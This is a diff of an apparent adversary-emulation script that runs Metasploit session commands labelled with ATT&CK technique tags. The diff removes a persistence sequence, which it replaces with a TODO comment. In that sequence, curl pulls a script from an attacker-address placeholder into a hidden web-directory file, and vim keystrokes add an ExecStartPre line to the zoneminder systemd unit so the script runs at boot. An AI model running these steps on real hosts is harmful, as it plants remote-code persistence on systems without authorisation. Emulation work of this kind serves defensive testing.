@@ -163,45 +163,7 @@ commands:
       tactics: "Discovery"
       technique_name: "System Owner/User Discovery"
 
-  - type: msf-session
-    cmd: curl http://$ATTACKER_ADDRESS/TODO.md > /var/www/default/.zm_preload.sh
-    session: "foothold"
-
-  - type: msf-session
-    cmd: vim /usr/lib/systemd/system/zoneminder.service
-    session: "foothold"
-
-  - type: msf-session
-    cmd: ":inoremap jj <ESC>"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: "/[Service"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: "o"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: "ExecStartPre=bash /var/www/default/.zm_preload.sh &"
-    session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
-
-  - type: msf-session
-    cmd: "jj"
-    session: "foothold"
-
-  - type: msf-session
-    cmd: ":wq!\n"
-    session: "foothold"
-    metadata:
-      techniques: "T1547"
-      tactics: "Persistence, Privilege Escalation"
-      technique_name: "Boot or Logon Autostart Execution"
+  # TODO: Implement privilege escalation
 
   - type: msf-session
     cmd: "exit"
